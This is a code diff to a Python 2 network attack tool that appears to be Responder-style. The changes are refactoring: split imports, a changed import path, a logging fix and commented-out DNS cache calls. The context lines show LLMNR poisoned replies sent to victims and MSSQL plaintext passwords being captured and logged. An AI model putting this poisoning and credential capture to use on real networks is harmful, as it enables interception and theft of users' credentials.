@@ -16,13 +16,28 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,socket,thread,Fingerprint,random,os,BaseHTTPServer, select,urlparse,zlib, string, time
-from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
+import sys
+import struct
+import SocketServer
+import re 
+import socket
+import thread
+import Fingerprint
+import random
+import os
+import BaseHTTPServer
+import select
+import urlparse
+import zlib
+import string
+import time
+
+from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler, BaseServer
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
 from random import randrange
-from libs.sslstrip.DnsCache import DnsCache
+from core.sslstrip.DnsCache import DnsCache
 
 def IsOsX():
     Os_version = sys.platform
@@ -1067,7 +1082,7 @@ def ParseClearTextSQLPass(Data,client):
     PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
     UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
     if PrintData(outfile,UserName+":"+PwdStr):
-        logging.warning("MSSQL PlainText Password captured from :",client)
+        logging.warning("MSSQL PlainText Password captured from :",str(client))
         logging.warning("MSSQL Username: %s Password: %s"%(UserName, PwdStr))
         WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
     logging.warning('MSSQL PlainText Password captured from :%s'%(client))
@@ -1232,7 +1247,7 @@ class LLMNR(BaseRequestHandler):
                             if RespondToIPScope(RespondTo, self.client_address[0]):
                                 if RespondToSpecificName(RespondToName) == False:
                                     buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                                    DnsCache.getInstance().setCustomRes(Name.lower())
+                                    #DnsCache.getInstance().setCustomRes(Name.lower())
                                     buff.calculate()
                                     for x in range(1):
                                         soc.sendto(str(buff), self.client_address)
@@ -1254,7 +1269,7 @@ class LLMNR(BaseRequestHandler):
 
                                 if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                                     buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                                    DnsCache.getInstance().setCustomRes(Name.lower())
+                                    #DnsCache.getInstance().setCustomRes(Name.lower())
                                     buff.calculate()
                                     for x in range(1):
                                         soc.sendto(str(buff), self.client_address)
@@ -1277,7 +1292,7 @@ class LLMNR(BaseRequestHandler):
                     if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
                         if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                             buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                            DnsCache.getInstance().setCustomRes(Name.lower())
+                            #DnsCache.getInstance().setCustomRes(Name.lower())
                             buff.calculate()
                             Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                             for x in range(1):
@@ -1297,7 +1312,7 @@ class LLMNR(BaseRequestHandler):
                                     pass
                         if RespondToSpecificName(RespondToName) == False:
                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                             DnsCache.getInstance().setCustomRes(Name.lower())
+                             #DnsCache.getInstance().setCustomRes(Name.lower())
                              buff.calculate()
                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                              for x in range(1):
